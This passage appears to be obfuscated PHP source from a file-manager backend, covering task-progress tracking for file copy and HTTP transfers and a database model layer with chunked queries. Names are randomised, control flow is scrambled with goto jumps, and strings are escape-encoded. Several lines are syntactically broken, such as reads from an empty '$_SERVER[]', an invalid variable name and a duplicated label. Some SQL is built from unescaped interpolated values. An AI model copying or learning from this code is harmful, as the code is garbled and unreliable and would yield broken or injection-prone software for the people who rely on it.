Hook::unbind($D̨[1481], array($this, $D̨[1482])); Hook::unbind($D̨[539], array($this, $D̨[1483])); Hook::unbind($D̨[540], array($this, $D̨[1484])); goto eǖɅ; fݱ: Hook::unbind($D̨[506], array($this, $D̨[1486])); Hook::unbind($D̨[511], array($this, $D̨[1486])); Hook::unbind($D̨[513], array($this, $D̨[1486])); goto bƻ; eǖɅ: Hook::unbind($D̨[542], array($this, $D̨[1485])); Hook::unbind($D̨[543], array($this, $D̨[1485])); Hook::unbind($D̨[509], array($this, $D̨[1486])); goto fݱ; A: Hook::unbind($D̨[1490], array($this, $D̨[1491])); Hook::unbind($D̨[1492], array($this, $D̨[1493])); Hook::unbind($D̨[1494], array($this, $D̨[1495])); goto E˗; bƻ: Hook::unbind($D̨[515], array($this, $D̨[1486])); Hook::unbind($D̨[1487], array($this, $D̨[1488])); Hook::unbind($D̨[532], array($this, $D̨[1489])); goto A; Eτ: $D̨ =& $_SERVER[]; Hook::unbind($D̨[1477], array($this, $D̨[1478])); Hook::unbind($D̨[1479], array($this, $D̨[1480])); goto cȅ; E˗: } public function copyMoveStart($b炈, $B̆, $Cؤ, $c) { goto C讚; e: if (substr($B̆, 0, strlen($Cݬ)) == $Cݬ) { return; } if (substr($c, 0, strlen($Cݬ)) == $Cݬ) { return; } $E =& $this->task; goto D̺ς; C讚: $CמÃő =& $_SERVER[]; self::log($CמÃő[1505] . $B̆ . $CמÃő[66] . $c); $Cݬ = rtrim(TEMP_FILES, $CמÃő[8]); goto e; D̺ς: $E[$CמÃő[1506]] = KodIO::transferType($b炈, $Cؤ); $this->update(); goto Cɤ; Cɤ: } public function updateAfter() { goto aӇ; f: if ($this->sourceModelCopyFlag) { return; } if ($Dߐ숣[$b[1506]] == $b[1109]) { return; } if ($Dߐ숣[$b[1506]] == $b[1055] || $Dߐ숣[$b[1506]] == $b[103]) { if ($Dߐ숣[$b[1500]]) { $Dߐ숣[$b[1503]] = $Dߐ숣[$b[1502]] + $Dߐ숣[$b[1499]]; } } else { if ($Dߐ숣[$b[1506]] == $b[1110]) { if ($Dߐ숣[$b[1500]] == $b[1055]) { $Dߐ숣[$b[1503]] = $Dߐ숣[$b[1502]] + $Dߐ숣[$b[1499]] * 0.5; } else { if ($Dߐ숣[$b[1500]] == $b[103]) { $Dߐ숣[$b[1503]] = $Dߐ숣[$b[1502]] + $Dߐ숣[$b[1498]] * 0.5 + $Dߐ숣[$b[1499]] * 0.5; } } } } goto FͿ; FͿ: $Dߐ숣[$b[1454]] = $Dߐ숣[$b[1503]] / $Dߐ숣[$b[717]]; if ($Dߐ숣[$b[1454]] > 0) { $C玧 = timeFloat() - $Dߐ숣[$b[1456]] - $Dߐ숣[$b[1459]]; $Dߐ숣[$b[1460]] = $C玧 * (1 - $Dߐ숣[$b[1454]]) / $Dߐ숣[$b[1454]]; } goto Eӈч; aӇ: $b =& $_SERVER[]; $Dߐ숣 =& $this->task; if (!$Dߐ숣[$b[717]]) { return; } goto f; Eӈч: } public function addPath($C) { goto b; FαԈک: $A = IO::infoWithChildren($C); $fԛԫ = $FɸɌ[$C[1507]] ? $FɸɌ[$C[1507]][$C[1508]] : 0; $FɸɌ[$C[1507]] = array($C[1508] => $fԛԫ + 1, $C[386] => $A[$C[28]], $C[75] => $A[$C[75]], $C[466] => $A[$C[466]] ? $A[$C[466]] : $A[$C[75]]); goto aݱ; b: $C =& $_SERVER[]; if (!$C) { return; } $FɸɌ =& $this->task; goto FαԈک; aݱ: if ($A[$C[29]] == $C[167]) { $FɸɌ[$C[991]] += 1; } else { $FɸɌ[$C[991]] += $A[$C[80]][$C[78]]; if ($A[$C[369]]) { $FɸɌ[$C[991]] += $A[$C[80]][$C[79]] + 1; } } $FɸɌ[$C[717]] += $A[$C[77]]; $this->update(); goto c۴; c۴: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($B̐) { $Fƽ =& $_SERVER[]; $EԼ =& $this->task; $EԼ[$Fƽ[1496]] = $B̐[$Fƽ[28]]; $EԼ[$Fƽ[993]] = $B̐[$Fƽ[28]]; $this->update(); } public function copyFileStart($b͊, $Cͯ, $b, $Aˈ, $f顛, $Cˬ) { goto Dȧ; Dȧ: $e =& $_SERVER[]; $Cģ = $f顛; if ($Cģ == $GLOBALS[$e[1509]]) { $Cģ = $GLOBALS[$e[1510]]; } goto eڷ; eڷ: $GLOBALS[$e[1510]] = $f顛; $GLOBALS[$e[1509]] = $Cˬ; $EΓܓ =& $this->task; goto e诅; e诅: $EΓܓ[$e[1496]] = $Cģ; $EΓܓ[$e[1498]] = (int) $b͊->size($Cͯ); $EΓܓ[$e[1499]] = 0; goto Cߛۈ; Cߛۈ: $EΓܓ[$e[993]] = $e[33]; $EΓܓ[$e[1500]] = $e[33]; $EΓܓ[$e[1501]] = 0; goto F޶; F޶: $this->update(); goto cֽ; cֽ: } public function copyFileEnd($F˜, $f, $E, $A, $Dл, $Cۃʜ) { $Aà =& $_SERVER[]; $B =& $this->task; $B[$Aà[1499]] = $B[$Aà[1498]]; $B[$Aà[1500]] = $Aà[33]; if ($Dл == $B[$Aà[1496]]) { $B[$Aà[1502]] += $B[$Aà[1498]]; $B[$Aà[1503]] = $B[$Aà[1502]]; $this->update(1); } else { $this->update(); $B[$Aà[1499]] = 0; } self::log($Aà[1511] . $f . $Aà[66] . $A . $Aà[217] . $Dл . $Aà[1512] . $B[$Aà[1496]]); } public function updateFileEnd($a, $f) { goto d; e: $this->update(1); self::log($eؤ֓[1513] . $a); goto EӴ; Bą: $c۟[$eؤ֓[1498]] = $f; $c۟[$eؤ֓[1502]] += $f; $c۟[$eؤ֓[1503]] = $c۟[$eؤ֓[1502]]; goto e; d: $eؤ֓ =& $_SERVER[]; $c۟ =& $this->task; $c۟[$eؤ֓[1496]] = $a; goto Bą; EӴ: } public function sourceModelCopy($Cն) { goto e߽; e߽: $bԅϏ =& $_SERVER[]; $Cݾ = $Cն[0]; $d삕Ǌ = $Cն[1]; goto aʛޕ; Eȸ: switch ($Cݾ) { case $bԅϏ[507]: $E͞Ȃ = 1; break; case $bԅϏ[510]: $fๆ䋦[$bԅϏ[1496]] = $d삕Ǌ[$bԅϏ[28]]; break; case $bԅϏ[512]: $E͞Ȃ = intval($Cն[$bԅϏ[363]] * 0.4); break; case $bԅϏ[514]: $E͞Ȃ = intval($Cն[$bԅϏ[363]] * 0.2); break; case $bԅϏ[516]: $E͞Ȃ = intval($Cն[$bԅϏ[363]] * 0.4); break; } $this->update($E͞Ȃ); $this->sourceModelCopyFlag = !1; goto d֮; aʛޕ: $fๆ䋦 =& $this->task; $this->sourceModelCopyFlag = !0; $E͞Ȃ = 0; goto Eȸ; d֮: } public function sourceRemove($F;, $f) { $EĹȜ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $cؚ = 1; if (isset($F;[$EĹȜ[80]])) { $cؚ = $F;[$EĹȜ[80]][$EĹȜ[78]] + $F;[$EĹȜ[80]][$EĹȜ[79]] + 1; } $this->update($cؚ); $this->sourceModelCopyFlag = !1; } public function sourceMove($DϷ) { $this->sourceRemove($DϷ, !1); } public function curlProgress($C㹋܈, $C̒, $Fڐ, $aϩ, $AΪڋ) { $f =& $_SERVER[]; $Bæ =& $this->task; if ($AΪڋ > 0) { $Bæ[$f[993]] = $f[1514]; $Bæ[$f[1500]] = $f[103]; if ($Bæ[$f[1498]] == $aϩ || $aϩ > 1024 * 1024) { $Bæ[$f[1499]] = $AΪڋ; } if ($Bæ[$f[1501]]) { $Bæ[$f[1499]] = $AΪڋ + $Bæ[$f[1501]]; } } else { if ($Fڐ > 0) { if ($Bæ[$f[1498]] == $C̒) { $Bæ[$f[1499]] = $Fڐ; $Bæ[$f[993]] = $f[1515]; $Bæ[$f[1500]] = $f[1055]; } } } $this->update(); } public function curlProgressStart($A) { } public function curlProgressEnd($CҬϯ) { $AΠ =& $_SERVER[]; $DЙ =& $this->task; $fɩ = curl_getinfo($CҬϯ); $F污 = $fɩ[$AΠ[1516]]; if ($DЙ[$AΠ[1500]] == $AΠ[103] && $F污) { $DЙ[$AΠ[1501]] += $F污; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $fޗő =& $_SERVER[]; $a˽篤 =& $this->task; $a˽篤[$fޗő[1517]] = 1; Hook::bind($fޗő[1490], array($this, $fޗő[1518])); Hook::bind($fޗő[1492], array($this, $fޗő[1519])); Hook::bind($fޗő[1494], array($this, $fޗő[1520])); } protected function endAfter() { $d =& $_SERVER[]; Hook::unbind($d[1490], array($this, $d[1518])); Hook::unbind($d[1492], array($this, $d[1519])); Hook::unbind($d[1494], array($this, $d[1520])); } public function progressStart($a匜) { $DǮ =& $_SERVER[]; $DͶ = curl_getinfo($a匜); self::log($DǮ[1521] . $DͶ[$DǮ[295]]); self::valueSet($this->task[$DǮ[367]], $this->task); } public function progressEnd($Eذß) { $BҺ =& $_SERVER[]; self::log($BҺ[1522] . $this->task[$BҺ[367]]); $this->end(); } public function progress($BЮ, $bϣ, $Aޘ, $Dʒˢ, $A碎Ù) { $dꋍӹ =& $_SERVER[]; $D =& $this->task; if ($A碎Ù > 0) { $D[$dꋍӹ[991]] = $D[$dꋍӹ[991]] == 0 ? $Dʒˢ : $D[$dꋍӹ[991]]; $D[$dꋍӹ[1005]] = $A碎Ù; } else { if ($Aޘ > 0) { $D[$dꋍӹ[991]] = $D[$dꋍӹ[991]] == 0 ? $bϣ : $D[$dꋍӹ[991]]; $D[$dꋍӹ[1005]] = $Aޘ; } } $this->update(); self::log("\x70\x72\x6f\147\x72\x65\163\x73\x48\x74\x74\160\72\x64\157\x77\156\x3a{$Aޘ}\x2f{$bϣ}\x3b\x20\x75\160\154\x6f\x61\x64\x3a{$A碎Ù}\x2f{$Dʒˢ}\73"); } } goto Cʕ; cϒ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\146\x79\x54\x69\155\145", "\164\151\155\x65", "\x69\156\163\x65\162\164\x2c\x75\x70\x64\141\x74\x65", "\x66\165\156\143\x74\x69\157\x6e"), array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\x6e")); public function setDataAuto($c) { $this->dataAuto = $c; } public function __construct($F԰ӌ = '', $C싑 = '', $Dݠؠ = '') { parent::__construct($F԰ӌ, $C싑, $Dݠؠ); } public static function textEncode($DΕۆ) { if (!$DΕۆ) { return $DΕۆ; } $bᔂ = json_encode($DΕۆ); $bᔂ = preg_replace_callback($_SERVER[][342], function ($DȆ) { return addslashes($DȆ[0]); }, $bᔂ); return json_decode($bᔂ); } public static function textDecode($AӲ) { $cް =& $_SERVER[]; $b݋߽ = json_encode($AӲ); $b݋߽ = preg_replace_callback($cް[343], function ($f) { return $_SERVER[][93]; }, $b݋߽); return json_decode($b݋߽); } protected $tableMeta = array(); protected function _beforeInsert(&$E홒, $fƪ) { $BɊ =& $_SERVER[]; if (!$this->checkDataAutoHas($BɊ[344])) { return; } $this->dataBeforeFilter($E홒, $BɊ[344]); } protected function _beforeUpdate(&$c҅, $E) { $F펂 =& $_SERVER[]; if (!$this->checkDataAutoHas($F펂[345])) { return; } $this->dataBeforeFilter($c҅, $F펂[345]); } protected function _afterSelect(&$b獏, $Dࡼ) { if (!is_array($b獏)) { return; } if (!$this->checkDataAutoHas($_SERVER[][346])) { return; } foreach ($b獏 as &$C՘) { $this->dataAfterFilter($C՘); } } protected function _afterFind(&$D, $fښˡ) { if (!is_array($D)) { return; } if (!$this->checkDataAutoHas($_SERVER[][346])) { return; } $this->dataAfterFilter($D); } public function setAutoIncrement($e) { $D߉ʄ = array($this->getPk() => $e); $cߵ = $this->data($D߉ʄ)->add(); if ($cߵ) { $this->delete($cߵ); } } public function getAutoIncrement() { $d̥ٛլ = $this->getTableName(); $a = $this->max($this->getPk()); $Aΐ = $this->query("\163\x68\157\167\40\164\x61\x62\154\x65\x20\163\164\141\x74\165\163\x20\167\150\145\162\x65\x20\x4e\141\155\x65\x3d\x27{$d̥ٛլ}\47"); $b˄ = $Aΐ[0][$_SERVER[][347]]; $Bӝף = max($a, $b˄); return $Bӝף; } protected function _callBefore($a㬆, $A) { return $this->cacheCallCheck($a㬆, $A, !1); } protected function _callAfter($bߢ, $C󉟐) { return $this->cacheCallCheck($bߢ, $C󉟐, !0); } protected function cacheFunctionAlias($f) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D쿺ʵ, $bͯ, $Cď = false) { $fͺ = $this->cacheFunctionAlias($bͯ); if (!$fͺ) { return; } foreach ($fͺ as $C => $b) { $Bצҋ = $b[0]; $a = explode($_SERVER[][47], $b[1]); if ($D쿺ʵ == $C) { return $this->cacheFunctionGet($C, $Bצҋ); } if ($Cď && in_array($D쿺ʵ, $a)) { $this->cacheFunctionClear($C, $Bצҋ); } } } public function cacheFunctionGet($eݠ, $B︩莅) { $f҂ = $this->cacheKeyMake($eݠ, $B︩莅); $fבк = Cache::get($f҂); if (!is_array($fבк)) { $fבк = call_user_func_array(array($this, $eݠ), array($B︩莅, !0)); Cache::set($f҂, $fבк); } return $fבк; } public function cacheFunctionClear($f̘, $Eñ) { $E = $Eñ; if (!is_array($Eñ)) { $E = array($Eñ); } foreach ($E as $e臶) { $Dǧߟ = $this->cacheKeyMake($f̘, $e臶); Cache::remove($Dǧߟ); } } private function cacheKeyMake($Cֳ͗, $e) { $D =& $_SERVER[]; return get_class($this) . $D[70] . $Cֳ͗ . $D[348] . $e; } protected function selectPage($C݈ = 200, $f߂ƌ = 1) { goto F׎; aރ: if ($B == 1) { $FЋ = count($fҘ); } $E탰 = array($c܂[351] => array($c܂[352] => $FЋ, $c܂[349] => $C݈, $c܂[340] => $f߂ƌ, $c܂[353] => $B), $c܂[354] => $fҘ ? $fҘ : array()); return $E탰; goto Dȉ; F̳Ó: $Aޖ󥞥 = $e¹; $Aޖ󥞥[$c܂[350]] = array(); $this->optionsValue($Aޖ󥞥); goto cޑĈ; cޑĈ: $FЋ = intval($this->count()); $C݈ = intval($C݈); $C݈ = $C݈ <= 5 ? 5 : ($C݈ >= $A͚ޖ ? $A͚ޖ : $C݈); goto E֡緖; B݋: $A͚ޖ = 4000; $C݈ = isset($in[$c܂[349]]) ? $in[$c܂[349]] : $C݈; if ($C݈ === -1) { unset($in[$c܂[349]]); $A͚ޖ = 100000000; $C݈ = $A͚ޖ; } goto F̳Ó; e慮: $this->optionsValue($e¹); $fҘ = $this->page($f߂ƌ, $C݈)->select(); $fҘ = is_array($fҘ) ? $fҘ : array(); goto aރ; F׎: $c܂ =& $_SERVER[]; global $in; $e¹ = $this->optionsValue(); goto B݋; E֡緖: $B = ceil($FЋ / $C݈); $f߂ƌ = intval(isset($in[$c܂[340]]) ? $in[$c܂[340]] : $f߂ƌ); $f߂ƌ = $f߂ƌ <= 1 ? 1 : ($f߂ƌ >= $B ? $B : $f߂ƌ); goto e慮; Dȉ: } protected function checkLength($d, $fо = 0, $d溸 = '') { $AӺ =& $_SERVER[]; $fо = $fо ? $fо : 65536; if (!$d || strlen($d) < $fо) { return; } $d溸 = $d溸 ? $d溸 . $AӺ[67] : $AӺ[33]; show_json($d溸 . LNG($AӺ[355]) . "\50{$fо}\51", !1); } protected function metaSet($Eك, $eҌ = null, $f = null) { goto D; A: $B։ = $this->tableMeta[$bǕ[357]]; $e = Model($B։); $dϾ = array($aڊ񒱅 => $Eك, $bǕ[358] => $eҌ); goto F϶; aޔ: if (is_string($eҌ)) { $a[$eҌ] = $f; } $cʏƴ = array(); foreach ($a as $A˼Ԉ => $Fȕ) { $this->checkLength($Fȕ, !1, $B։ . $bǕ[4] . $A˼Ԉ); $cʏƴ[] = array($aڊ񒱅 => $Eك, $bǕ[89] => $A˼Ԉ, $bǕ[359] => $Fȕ); } goto e; e: $e->where(array($aڊ񒱅 => $Eك))->addAll($cʏƴ, array(), !0); return !0; goto D; D: $bǕ =& $_SERVER[]; if (!$this->tableMeta) { return !1; } $aڊ񒱅 = $this->tableMeta[$bǕ[356]]; goto A; F϶: if (is_null($eҌ)) { return $e->where(array($aڊ񒱅 => $Eك))->delete(); } if (is_null($f) && is_string($eҌ)) { return $e->where($dϾ)->delete(); } $a = is_array($eҌ) ? $eҌ : array(); goto aޔ; D: } public function metaGet($E) { goto c⏗; c⏗: $aȤֻ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $bٟ = $this->tableMeta[$aȤֻ[356]]; goto Fúм; Fúм: $d = Model($this->tableMeta[$aȤֻ[357]]); $e刷 = array($bٟ => $E); $Eʊ = $d->field($aȤֻ[360])->where($e刷)->select(); goto Cܧ; Cܧ: $Eʊ = array_to_keyvalue($Eʊ, $aȤֻ[89], $aȤֻ[359]); return $Eʊ; goto a٩ߥ; a٩ߥ: } private function checkDataAutoHas($b诹) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $c) { if (in_array($b诹, explode($_SERVER[][47], $c[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E, $fä) { $F͊ =& $_SERVER[]; foreach ($this->dataAuto as $B͠) { $BĒ̠ = $B͠[0]; if (!in_array($fä, explode($F͊[47], $B͠[2]))) { continue; } switch (trim($B͠[3])) { case $F͊[309]: case $F͊[310]: $aĖ = $B͠[1]; $Fۡϐ = isset($B͠[4]) ? (array) $B͠[4] : array(); if ($aĖ == $F͊[190] && array_key_exists($BĒ̠, $E)) { if (!$E[$BĒ̠]) { unset($E[$BĒ̠]); } break; } if (isset($E[$BĒ̠])) { array_unshift($Fۡϐ, $E[$BĒ̠]); } if ($F͊[309] == $B͠[3]) { $E[$BĒ̠] = call_user_func_array($aĖ, $Fۡϐ); } else { $E[$BĒ̠] = call_user_func_array(array(&$this, $aĖ), $Fۡϐ); } break; case $F͊[261]: $E[$BĒ̠] = $E[$B͠[1]]; break; case $F͊[282]: if (isset($E[$BĒ̠]) && !is_string($E[$BĒ̠])) { $E[$BĒ̠] = json_encode_force($E[$BĒ̠]); } break; case $F͊[311]: if ($E[$BĒ̠] === $F͊[33]) { unset($E[$BĒ̠]); } break; case $F͊[312]: $E[$BĒ̠] = $B͠[1]; default: break; } } if ($fä == $F͊[344]) { $Aۇ = strtolower($this->db->getDbType()); if (strpos($Aۇ, $F͊[9]) !== 0) { return; } $dւ = $this->field(!0)->fields; $a˕ = $dւ[$F͊[240]]; if (isset($dւ[$F͊[239]])) { unset($a˕[$dւ[$F͊[239]]]); } foreach ($a˕ as $D͛ => $fä) { if (!isset($E[$D͛])) { $E[$D͛] = $F͊[33]; } } } } private function dataAfterFilter(&$dÜ) { $c㭘 =& $_SERVER[]; foreach ($this->dataAuto as $E) { $D֫ = $E[0]; if (!in_array($c㭘[346], explode($c㭘[47], $E[2]))) { continue; } if (!isset($dÜ[$D֫])) { continue; } switch (trim($E[3])) { case $c㭘[309]: case $c㭘[310]: $b磆х = isset($E[4]) ? (array) $E[4] : array(); array_unshift($b磆х, $dÜ[$D֫]); if ($c㭘[309] == $E[3]) { $dÜ[$D֫] = call_user_func_array($E[1], $b磆х); } else { $dÜ[$D֫] = call_user_func_array(array(&$this, $E[1]), $b磆х); } break; case $c㭘[261]: $dÜ[$D֫] = $dÜ[$E[1]]; break; case $c㭘[282]: $f˛ = $dÜ[$D֫]; $dÜ[$D֫] = json_decode($f˛, !0); if (is_null($dÜ[$D֫])) { $dÜ[$D֫] = $f˛; } break; case $c㭘[311]: if ($dÜ[$D֫] === $c㭘[33]) { unset($dÜ[$D֫]); } break; case $c㭘[312]: $dÜ[$D֫] = $E[1]; default: break; } } } public function saveAll($Bۈ) { goto A͆; A͆: $Cௐ =& $_SERVER[]; $aĲ̄ = $this->tablePrefix . $this->tableName; $dߴ = self::SQL_WHERE_IN_CHUNK; goto C; F: $this->chunkEventSet(); goto B; Dދ߻: $c = array(); $eׇ = count($Bۈ); for ($e = 0; $e < $eׇ; $e++) { $e䮈ۉ = $Bۈ[$e]; if (!is_array($e䮈ۉ) || count($e䮈ۉ) != 4) { continue; } $Bð = "\125\x50\x44\x41\x54\105\x20\140{$aĲ̄}\140\40\x53\105\124\40{$e䮈ۉ[2]}\x20\x3d\40\103\x41\123\105\x20{$e䮈ۉ[0]}\x20\xa"; if ($bʘԶ == 0) { $AЈ = $Bð; } $c[] = $Cௐ[113] . $e䮈ۉ[1] . $Cௐ[113]; $bʘԶ++; $AЈ .= "\40\x57\110\x45\x4e\40\47{$e䮈ۉ[1]}\47\40\124\110\105\x4e\40\47{$e䮈ۉ[3]}\x27\40\xa"; if ($bʘԶ == $dߴ || $e == $eׇ - 1) { goto f; EΎЫ: $bʘԶ = 0; $AЈ = $Bð; $this->chunkEventCheck(count($c)); goto B; B: $c = array(); goto A됝팑; f: $dߎ = implode($Cௐ[47], $c); $AЈ .= "\40\105\116\x44\40\x20\127\x48\105\122\x45\x20{$e䮈ۉ[0]}\x20\x49\x4e\x20\x28{$dߎ}\51\40"; $this->execute($AЈ); goto EΎЫ; A됝팑: } } goto F; C: $Bۈ = is_array($Bۈ) ? $Bۈ : array(); $AЈ = $Cௐ[361]; $bʘԶ = 0; goto Dދ߻; B: } public function saveAllEach($f) { $Bމ =& $_SERVER[]; $aɂ̬ = $this->tablePrefix . $this->tableName; foreach ($f as $aҸ) { if (!is_array($aҸ) || count($aҸ) != 4) { continue; } $D = $aҸ[0] . $Bމ[362] . $aҸ[1] . $Bމ[113]; $b٫ = $aҸ[2] . $Bމ[362] . $aҸ[3] . $Bމ[113]; $f㾌 = "\165\160\144\x61\x74\x65\40{$aɂ̬}\x20\x73\x65\164\40{$b٫}\40\x77\150\145\162\145\x20{$D}\x3b"; $this->execute($f㾌); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fʋӎ = false, $a˶ = false) { $this->_chunkEvent = $fʋӎ; $this->_chunkEventParam = $a˶; } private function chunkEventCheck($e萋) { if (!$this->_chunkEvent) { return; } $f䲫 = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f䲫[$_SERVER[][363]] = $e萋; Hook::trigger($this->_chunkEvent, $f䲫); } public function addAll($f, $dܚ = array(), $aٰ = false) { goto dŨ䏜; dտ: if (empty($f)) { $this->error = think_lang($dÄ[259]); return !1; } $dܚ = $this->_parseOptions($dܚ); foreach ($f as $Aְ => $Dʷ) { $f[$Aְ] = $this->_facade($Dʷ); $this->_beforeInsert($f[$Aְ], $dܚ); } goto B; dŨ䏜: $dÄ =& $_SERVER[]; ignore_timeout(); $Cφظ = self::SQL_WHERE_IN_CHUNK; goto dտ; B: if (method_exists($this->db, $dÄ[260])) { for ($fբА = 0; $fբА < count($f); $fբА += $Cφظ) { $cѰ = array_slice($f, $fբА, $Cφظ); if (!is_array($cѰ) || count($cѰ) == 0) { break; } $C = $this->db->insertAll($cѰ, $dܚ, $aٰ); $this->chunkEventCheck(count($cѰ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($f as $Aְ => $Dʷ) { $C = $this->db->insert($Dʷ, $dܚ, $aٰ); } $this->commit(); } if (!1 !== $C) { $b = $this->getLastInsID(); if ($b) { return $b; } } return $C; goto bǎĕ; bǎĕ: } public function save($A = '', $F = array()) { goto Bɹ; Bɹ: $c =& $_SERVER[]; $bضԤ = self::SQL_WHERE_IN_CHUNK; $AƬ = $this->optionsValue(); goto a͚; eǎď: $Aή = $AƬ[$c[263]][$C쉮][1]; $Aή = is_array($Aή) ? $Aή : array(); $Dͩ = count($Aή); goto A; a͚: $C쉮 = $this->findWhereField($AƬ); if (!$C쉮) { return parent::save($A, $F); } $Cʐȏ = 0; goto eǎď; A: for ($dۂ = 0; $dۂ < $Dͩ; $dۂ += $bضԤ) { $fڂç = array_slice($Aή, $dۂ, $bضԤ); if (!is_array($fڂç) || count($fڂç) == 0) { break; } $AƬ[$c[263]][$C쉮][1] = $fڂç; $this->optionsValue($AƬ); $Cʐȏ += parent::save($A, $F); $this->chunkEventCheck(count($fڂç)); } $this->chunkEventSet(); return $Cʐȏ; goto b䌨; b䌨: } public function add($fţ = '', $d = array(), $d̡ = false) { if ($this->addTaskStatus && is_array($fţ)) { $this->addTaskData[] = $fţ; return; } return parent::add($fţ, $d, $d̡); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($A淅 = array()) { goto Bݕ̔ǩ; eʞśΨ: $E͉ = is_array($E͉) ? $E͉ : array(); $fߵ = null; for ($Aۿ = 0; $Aۿ < count($E͉); $Aۿ += $c) { $A = array_slice($E͉, $Aۿ, $c); if (!is_array($A) || count($A) == 0) { break; } $Bò[$bօ[263]][$d؛][1] = $A; $this->optionsValue($Bò); $Bԗ = parent::select($A淅); if (!$Bԗ) { continue; } if (is_null($fߵ)) { $fߵ = array(); } $fߵ = array_merge($fߵ, $Bԗ); } goto fȘ; fȘ: return $fߵ; goto B݆; Bݕ̔ǩ: $bօ =& $_SERVER[]; $c = self::SQL_WHERE_IN_CHUNK; $Bò = $this->optionsValue(); goto bć; bć: $d؛ = $this->findWhereField($Bò); if (!$d؛ || isset($Bò[$bօ[280]]) || isset($Bò[$bօ[340]])) { return parent::select($A淅); } $E͉ = $Bò[$bօ[263]][$d؛][1]; goto eʞśΨ; B݆: } public function delete($Dй = array()) { goto cŶ; Fޅ: $A¤ƺ = $this->findWhereField($B񏊆); if (!$A¤ƺ) { return parent::delete($Dй); } $dʯ = 0; goto Dåȯ; Dåȯ: $bّ = $B񏊆[$e[263]][$A¤ƺ][1]; $bّ = is_array($bّ) ? $bّ : array(); for ($bݣ = 0; $bݣ < count($bّ); $bݣ += $f) { $B͓ = array_slice($bّ, $bݣ, $f); if (!is_array($B͓) || count($B͓) == 0) { break; } $B񏊆[$e[263]][$A¤ƺ][1] = $B͓; $this->optionsValue($B񏊆); $dʯ += parent::delete($Dй); } goto Cތ; Cތ: return $dʯ; goto D; cŶ: $e =& $_SERVER[]; $f = self::SQL_WHERE_IN_CHUNK; $B񏊆 = $this->optionsValue(); goto Fޅ; D: } private function findWhereField($cǬ˛) { $Eּ =& $_SERVER[]; $f떞 = self::SQL_WHERE_IN_CHUNK; if (!is_array($cǬ˛) || !is_array($cǬ˛[$Eּ[263]])) { return !1; } foreach ($cǬ˛[$Eּ[263]] as $e => $E©) { if (is_array($E©) && isset($E©[0]) && is_string($E©[0]) && strtolower($E©[0]) == $Eּ[7] && is_array($E©[1]) && count($E©[1]) > $f떞) { ignore_timeout(); return $e; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\155\117\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($C = false, $C = "\x6d\x6f\x64\151\x66\171\x54\151\x6d\145", $EϜ = false) { $Bι = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Bι) { return $C ? null : array(); } if (!$C) { $Bι = array_filter(array_values($Bι)); return array_sort_by($Bι, $C, $EϜ); } return $Bι[$_SERVER[][364] . $C]; } public function insert($D郠) { goto bտ; dˌï: $aŃ = $aŃ ? $aŃ : 0; $D郠[$D͊؆Ȇ[367]] = ++$aŃ; $D郠[$D͊؆Ȇ[187]] = time(); goto D; dӠў: return $aŃ; goto C; bտ: $D͊؆Ȇ =& $_SERVER[]; $D郠 = array_field_key($D郠, $this->field); $aŃ = Model($this->modelType)->get($D͊؆Ȇ[365], $this->optionType . $D͊؆Ȇ[366]); goto dˌï; D: $D郠[$D͊؆Ȇ[107]] = time(); Model($this->modelType)->set($D͊؆Ȇ[365], $aŃ, $this->optionType . $D͊؆Ȇ[366]); Model($this->modelType)->set($D͊؆Ȇ[364] . $aŃ, $D郠, $this->optionType); goto dӠў; C: } public function update($bՆƶ, $b͞) { goto fӨ; f֒: return Model($this->modelType)->set($b[364] . $bՆƶ, $b͞, $this->optionType); goto C; fӨ: $b =& $_SERVER[]; $b͞ = array_field_key($b͞, $this->field); $A = $this->listData($bՆƶ); goto e; e: if (!$A) { return !1; } $b͞ = array_merge($A, $b͞); $b͞[$b[107]] = time(); goto f֒; C: } public function remove($fˉ) { return Model($this->modelType)->remove($_SERVER[][364] . $fˉ, $this->optionType); } public function clear() { $a =& $_SERVER[]; Model($this->modelType)->remove($a[365], $this->optionType . $a[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bȔ, $cޅݣ) { if (!$cޅݣ) { return !1; } $Fؤ = $this->listData(); $Fؤ = array_to_keyvalue($Fؤ, $bȔ); return isset($Fؤ[$cޅݣ]) ? $Fؤ[$cޅݣ] : !1; } public function findByName($F) { return $this->findByKey($_SERVER[][28], $F); } protected function resetData($b˰) { $fԐ =& $_SERVER[]; $b˰ = is_array($b˰) ? $b˰ : array(); $Fᴓ߭ = array(); for ($d = 0; $d < count($b˰); $d++) { $Fᴓ߭[$fԐ[364] . $b˰[$d][$fԐ[367]]] = $b˰[$d]; } return Model($this->modelType)->set($Fᴓ߭, !1, $this->optionType); } private function getAutoName($A̓) { $B = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$B || !isset($B[$A̓])) { return $A̓; } for ($e؍Ӥ = 1; $e؍Ӥ < count($B); $e؍Ӥ++) { $a = $A̓ . "\50{$e؍Ӥ}\x29"; if (!isset($B[$a])) { return $a; } } return $a; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($C߂ = false, $B = '', 